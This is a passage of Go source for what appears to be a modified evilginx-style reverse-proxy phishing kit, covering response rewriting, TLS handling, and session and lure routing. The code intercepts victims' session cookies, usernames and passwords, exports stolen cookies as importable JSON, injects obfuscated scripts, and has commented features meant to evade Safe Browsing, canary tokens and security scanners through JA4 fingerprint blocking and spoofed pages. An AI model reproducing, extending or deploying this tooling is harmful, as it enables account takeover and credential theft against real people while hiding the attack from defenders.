										re_puppet := regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
										body = []byte(re_puppet.ReplaceAllString(string(body), "${1}<script>"+obfPuppet+"</script>"))
										log.Debug("puppet: injected telemetry for %s", puppetTarget)
									}
								}
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
								js_nonce := ""
								if m_nonce != nil {
									js_nonce = " nonce=\"" + m_nonce[1] + "\""
								}
								// Obfuscate the JavaScript before injection to evade static signatures
								obfuscated_script := ObfuscateJS(script)
								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+obfuscated_script+"</script>${1}"))
							}
						}
					}
				}

				// --- URL path rewriting (evade Safe Browsing) ---
				if p.rewriter != nil && p.rewriter.IsEnabled() && (strings.Contains(mime, "html") || strings.Contains(mime, "javascript")) {
					bodyStr := string(body)
					for _, rule := range p.rewriter.GetRules() {
						if strings.Contains(bodyStr, rule.MatchPath) {
							bodyStr = strings.ReplaceAll(bodyStr, rule.MatchPath, rule.RewriteTo)
							log.Debug("rewrite: %s → %s", rule.MatchPath, rule.RewriteTo)
						}
					}
					body = []byte(bodyStr)
				}

				// --- Canary token stripping ---
				if p.canary != nil && p.canary.IsEnabled() {
					ct := resp.Header.Get("Content-Type")
					body = p.canary.StripCanaries(body, ct)
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}
							break
						}
					}
				}
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) {
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
							if resp != nil {
								r_url, err := url.Parse(s.RedirectURL)
								if err == nil {
									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
										r_url.Host = r_host
									}
									resp.Header.Set("Location", r_url.String())
								} else {
									resp.Header.Set("Location", s.RedirectURL)
								}
								return resp
							}
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	// If spoof_url is configured, serve cached content from that URL
	spoof_url := p.cfg.GetSpoofUrl()
	if len(spoof_url) > 0 {
		// Check if cache is valid (less than 5 minutes old)
		p.spoofCache.mutex.RLock()
		cache_valid := len(p.spoofCache.content) > 0 && time.Since(p.spoofCache.timestamp) < 5*time.Minute
		cached_content := p.spoofCache.content
		p.spoofCache.mutex.RUnlock()

		// If cache is invalid, fetch new content
		if !cache_valid {
			p.spoofCache.mutex.Lock()
			// Double-check after acquiring write lock
			if len(p.spoofCache.content) == 0 || time.Since(p.spoofCache.timestamp) >= 5*time.Minute {
				client := &http.Client{
					Timeout: 10 * time.Second,
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}
				
				spoof_req, err := http.NewRequest("GET", spoof_url, nil)
				if err == nil {
					spoof_req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
					spoof_resp, err := client.Do(spoof_req)
					if err == nil {
						defer spoof_resp.Body.Close()
						body, err := ioutil.ReadAll(spoof_resp.Body)
						if err == nil && len(body) > 0 {
							p.spoofCache.content = body
							p.spoofCache.timestamp = time.Now()
							cached_content = body
							log.Debug("spoof cache refreshed from: %s (%d bytes)", spoof_url, len(body))
						}
					}
				}
			} else {
				cached_content = p.spoofCache.content
			}
			p.spoofCache.mutex.Unlock()
		}

		// Serve cached content if available
		if len(cached_content) > 0 {
			resp := goproxy.NewResponse(req, "text/html", http.StatusOK, string(cached_content))
			if resp != nil {
				resp.Header.Set("Content-Type", "text/html; charset=utf-8")
				resp.Header.Set("Cache-Control", "public, max-age=300")
				return req, resp
			}
		}
	}

	// Fallback to redirect behavior if spoof_url not set or fetch failed
	if len(p.cfg.redirectUrl) > 0 {
		redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
			resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		SameSite       string `json:"sameSite"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         v.Secure,
			}
			// Convert int representation of SameSite to string representation
			c.SameSite = "unspecified"
			switch v.SameSite {
			case 2:
				c.SameSite = "lax"
			case 3:
				c.SameSite = "strict"
			case 4:
				c.SameSite = "no_restriction"
			}

			if len(domain) > 0 && domain[0] == '.' {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	results, err := json.Marshal(cookies)
	if err != nil {
		log.Error("%v", err)
	}
	return string(results)
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	// First try RC4-encrypted params (evilginx standard)
	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			}
		}
	}

	// Fallback: extract plain query params and hash fragment for email prefill
	// Supports ?uid=email, ?uid=base64email, #base64email
	if !ret {
		for k, v := range vals {
			if len(v[0]) > 0 {
				val := v[0]
				// Try base64 decode
				decoded, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(val, "="))
				if err == nil && len(decoded) > 3 && strings.Contains(string(decoded), "@") {
					session.Params[k] = string(decoded)
					log.Debug("param (plain b64): %s='%s'", k, string(decoded))
				} else if strings.Contains(val, "@") {
					// Plain email
					session.Params[k] = val
					log.Debug("param (plain): %s='%s'", k, val)
				} else {
					// Store raw value
					session.Params[k] = val
					log.Debug("param (raw): %s='%s'", k, val)
				}
				ret = true
			}
		}
	}

	// Also check URL fragment (hash) — stored as param "hash" if present
	if u.Fragment != "" {
		frag := u.Fragment
		decoded, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(frag, "="))
		if err == nil && len(decoded) > 3 && strings.Contains(string(decoded), "@") {
			session.Params["uid"] = string(decoded)
			log.Debug("param (hash b64): uid='%s'", string(decoded))
			ret = true
		}
	}

	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + GenRandomString(1) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.ReplaceAll(body, "{lure_url_html}", lure_url)
	body = strings.ReplaceAll(body, "{lure_url_js}", js_url)
	body = strings.ReplaceAll(body, "{ lure_url_html }", lure_url)
	body = strings.ReplaceAll(body, "{ lure_url_js }", js_url)
	body = strings.ReplaceAll(body, "{turnstile_sitekey}", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{recaptcha_sitekey}", p.cfg.recaptcha_sitekey)
	body = strings.ReplaceAll(body, "{ turnstile_sitekey }", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{ recaptcha_sitekey }", p.cfg.recaptcha_sitekey)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			// check for lure hostname
			cert, err := p.crt_db.GetHostnameCertificate(hostname)
			if err != nil {
				// check for phishlet hostname
				pl := p.getPhishletByOrigHost(hostname)
				if pl != nil {
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
						if err != nil {
							return nil, err
						}
					}
				}
			}
			// Fallback: wildcard cert — any subdomain of a phishlet's base domain
			if cert == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
						if ok && strings.HasSuffix(hostname, "."+phishDomain) {
							cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
							if err == nil {
								break
							}
						}
					}
				}
			}
			if cert != nil {
				return &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*cert},
				}, nil
			}
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

// peekedConn wraps a net.Conn with a bufio.Reader so that bytes peeked
// for JA4 fingerprinting are replayed to vhost.TLS() transparently.
type peekedConn struct {
	reader *bufio.Reader
	net.Conn
}

func (pc *peekedConn) Read(b []byte) (int, error) {
	return pc.reader.Read(b)
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			// --- JA4 TLS fingerprinting ---
			// Peek at the raw TLS ClientHello BEFORE vhost.TLS() consumes it.
			// We read the bytes, parse JA4, then replay them for vhost.
			var connForVhost net.Conn = c
			if p.ja4 != nil {
				br := bufio.NewReaderSize(c, 4096)
				// TLS record: 1 byte type + 2 bytes version + 2 bytes length
				header, err := br.Peek(5)
				if err == nil && header[0] == 0x16 { // TLS Handshake
					recordLen := int(header[3])<<8 | int(header[4])
					totalLen := 5 + recordLen
					if totalLen > 4096 {
						totalLen = 4096
					}
					clientHelloRaw, err := br.Peek(totalLen)
					if err == nil {
						ja4Hash := p.ja4.ParseClientHello(clientHelloRaw)
						if ja4Hash != "" {
							remote := c.RemoteAddr().String()
							log.Info("[ja4] fingerprint: %s from %s", ja4Hash, remote)
							if p.ja4.IsBlocked(ja4Hash) {
								log.Warning("[ja4] BLOCKED known scanner: %s from %s", ja4Hash, remote)
								c.Close()
								return
							}
						}
					}
				}
				// Wrap: buffered reader (with peeked bytes) + original conn for writes
				connForVhost = &peekedConn{reader: br, Conn: c}
			}

			tlsConn, err := vhost.TLS(connForVhost)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	// Wildcard lure: any unknown subdomain of the base domain acts as lure entry point
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			if strings.HasSuffix(hostname, "."+phishDomain) {
				return pl
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
			// Note: wildcard lure subdomains intentionally NOT mapped here
			// They are handled as lure entry points in the request handler
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	// Wildcard: any subdomain of base domain
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if ok && strings.HasSuffix(hostname, "."+phishDomain) {
				return phishDomain, true
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session || ph.is_landing {
						return true
					}
					return false
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	// Wildcard: any subdomain of base domain handles sessions (for lure entry)
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if ok && strings.HasSuffix(hostname, "."+phishDomain) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) SetPuppet(puppet *EvilPuppet) {
	p.puppet = puppet
}

func (p *HttpProxy) SetCanaryStripper(cs *CanaryStripper) {
	p.canary = cs
}

func (p *HttpProxy) SetJA4(ja4 *JA4Fingerprinter) {
	p.ja4 = ja4
}

func (p *HttpProxy) SetNotifier(n *Notifier) {
	p.notifier = n
}

func (p *HttpProxy) SetURLRewriter(rw *URLRewriter) {
	p.rewriter = rw
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	sid, ok := p.ip_sids[ip_addr]
	return sid, ok
}

func (p *HttpProxy) rotatingDial(network, addr string) (net.Conn, error) {
	p.rotationMtx.Lock()
	proxyURL := p.rotationProxies[p.rotationIndex%len(p.rotationProxies)]
	p.rotationIndex++
	p.rotationMtx.Unlock()

	u, err := url.Parse(proxyURL)
	if err != nil {
		log.Error("proxy rotation: invalid URL %s: %v", proxyURL, err)
		return net.DialTimeout(network, addr, 10*time.Second)
	}

	if strings.HasPrefix(u.Scheme, "http") {
		var dproxy *http_dialer.HttpTunnel
		if u.User != nil {
			pw, _ := u.User.Password()
			dproxy = http_dialer.New(u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(u.User.Username(), pw)))
		} else {
			dproxy = http_dialer.New(u)
		}
		return dproxy.Dial(network, addr)
	}

	// SOCKS5
	dproxy, err := proxy.FromURL(u, nil)
	if err != nil {
		log.Error("proxy rotation: SOCKS5 error for %s: %v", proxyURL, err)
		return net.DialTimeout(network, addr, 10*time.Second)
	}
	return dproxy.Dial(network, addr)
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}

	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

type CaptchaValidatedResp struct {
	Success     bool          `json:"success"`
	ChallengeTs string        `json:"challenge_ts"`
	Hostname    string        `json:"hostname"`
	ErrorCodes  []interface{} `json:"error-codes"`
	Action      string        `json:"action"`
	Cdata       string        `json:"cdata"`
}

func (p *HttpProxy) ValidateTurnstileCaptcha(ip, response string) bool {
	dataToValidate := url.Values{
		"secret":   []string{p.cfg.turnstile_privkey},
		"response": []string{response},
		"remoteip": []string{ip},
	}

	validation_resp, err := http.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", dataToValidate)
	if err != nil {
		log.Error("turnstile validation request: %v", err)
		return false
	}

	res := &CaptchaValidatedResp{}
	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
	defer validation_resp.Body.Close()
	log.Debug("captcha response: %+v", res)

	if !res.Success {
		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
		return false
	}

	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
		return false
	}
	return true
}

func (p *HttpProxy) ValidateRecaptcha(ip, response string) bool {
	dataToValidate := url.Values{
		"secret":   []string{p.cfg.recaptcha_privkey},
		"response": []string{response},
		"remoteip": []string{ip},
	}

	validation_resp, err := http.PostForm("https://www.google.com/recaptcha/api/siteverify", dataToValidate)
	if err != nil {
		log.Error("turnstile validation request: %v", err)
		return false
	}

	res := &CaptchaValidatedResp{}
	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
	defer validation_resp.Body.Close()
	log.Debug("captcha response: %+v", res)

	if !res.Success {
		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
		return false
	}

	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
		return false
	}
	return true
}

// Get the IP address of the server's connected user.
func GetUserIP(_ http.ResponseWriter, httpServer *http.Request) (userIP string) {
	if v := httpServer.Header.Get("CF-Connecting-IP"); v != "" {
		userIP = strings.TrimSpace(v)
	} else if v := httpServer.Header.Get("X-Forwarded-For"); v != "" {
		// X-Forwarded-For can be comma-separated: client, proxy1, proxy2
		parts := strings.Split(v, ",")
		userIP = strings.TrimSpace(parts[0])
	} else if v := httpServer.Header.Get("X-Real-IP"); v != "" {
		userIP = strings.TrimSpace(v)
	} else {
		userIP = httpServer.RemoteAddr
		if host, _, err := net.SplitHostPort(userIP); err == nil {
			userIP = host
		}
	}
	// Validate the IP
	if ip := net.ParseIP(userIP); ip != nil {
		userIP = ip.String()
	}
	return userIP
}

// checkAntibotPw queries the antibot.pw v2-blockers API to check if an IP/UA is a bot.
